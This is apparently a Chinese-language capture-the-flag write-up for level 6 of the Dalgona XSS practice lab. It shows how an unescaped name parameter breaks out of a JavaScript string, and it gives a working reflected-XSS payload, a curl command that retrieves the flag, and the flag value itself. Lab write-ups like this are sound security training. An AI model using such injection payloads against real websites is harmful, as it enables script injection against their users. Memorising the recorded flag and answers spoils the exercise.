## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 6 关
（样式表 `static/css/xss/xss6.css`，标题 `Dalgona - Circle`）。

入口 `/page?name=<输入>`。反射点在内联脚本的**双引号字符串字面量**里：

```html
<div class="solution-text"><script> var name = "TESTX"; document.write('Hello ' + name); </script></div>
```

### 关键观察

**1. 输入完全原样进入 JS 字符串，没有转义。**

用 `Q<ch>Q` 逐字符探测，`<`、`>`、`'`、`;`、`(`、`=`、空格、`"` 都原样出现。
`"` 不是被删掉，而是直接把字符串提前闭合：

```text
name=Q"Q  ->  var name = "Q"Q"; document.write('Hello ' + name);
```

**2. 判据是「alert 的参数必须正好是 `XSS`」。**

| 输入 | 结果 |
| --- | --- |
| `";alert("XSS");//` | **flag** |
| `";alert(1);//` | `Oops! You did an alert with 1 instead of "XSS"` |
| `";alert("XSS");`（不带注释） | `TypeError: Attempting to change the …` |
| `;alert('XSS');//`（不闭合双引号） | `TypeError`（仍留在字符串里，没有执行） |

所以必须**闭合双引号 + 用双引号包 XSS + `//` 注释掉尾部**。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get --data-urlencode 'name=";alert("XSS");//' "http://$T/page" \
| grep -o 'flag{[^}]*}'
# flag{866a097e-303a-470b-812d-611b35d09ef0}
```

`//` 把原本的 `"; document.write(...)` 注释掉，避免恢复字符串时的语法错误。

### flag 位置

`/page` 成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **先判断反射落在 HTML 还是 JS 字符串里。** 本题落在 `var name = "..."`，用 HTML 标签
  （`<svg onload=…>`）也能过，但最直接的还是按 JS 语法打断：`";…;//`。
- **`//` 不能省。** 不注释尾部，`"; document.write('Hello ' + name);` 会继续参与解析，
  报 `TypeError`，判据失败。
- **该靶场的判据是「alerts 的参数等于 XSS」**，不是「执行了任意 JS」。
  `alert(1)` 会明确告诉你差在哪，比盲试 payload 省时间。
- 单引号 payload 失败不代表引号被过滤——是输入还在字符串里没断开。
